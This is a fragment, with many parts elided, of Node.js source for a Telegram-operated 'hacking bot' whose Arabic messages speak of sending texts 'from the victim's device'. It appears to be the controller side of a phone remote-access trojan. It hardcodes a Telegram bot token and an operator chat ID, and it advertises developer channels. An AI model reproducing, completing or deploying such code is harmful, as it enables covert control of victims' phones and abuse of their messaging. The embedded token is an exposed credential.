...
const token = '6508170865:AAGisH3Ep7edRBUAIGPzib9sVyELYnW8BCc'
const id = '5545530980'
...
app.get('/', function (req, res) {
    res.send('<h1 align="center">تم بنجاح تشغيل البوت مطور البوت :  المزعج الحاكم قناة المطور @XAlmoz3j1   مراسله المطور اذا عطل معك شي @Z_Y_Y_S</h1>')
})
...
appBot.on('message', (message) => {
    ...
    if (message.reply_to_message) {
        ...
        if (message.reply_to_message.text.includes('°• جيد الان قم بكتابة الرسالة المراد ارسالها من جهاز الضحية الئ الرقم الذي كتبتة قبل قليل....')) {
            ...
            appBot.sendMessage(id,
                ...
                '• ستتلقى ردًا في اللحظات القليلة القادمة المطور المزعج الحاكم قناة المطور @XAlmoz3j1   مراسله المطور اذا عطل معك شي @Z_Y_Y_S ،',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
    ...
    if (id == chatId) {
        if (message.text == '/start') {
            appBot.sendMessage(id,
                '°• مرحبا بكم في بوت الاختراق مطور البوت المزعج الحاكم قناة المطور @XAlmoz3j1   مراسله المطور اذا عطل معك شي @Z_Y_Y_S\n\n' +
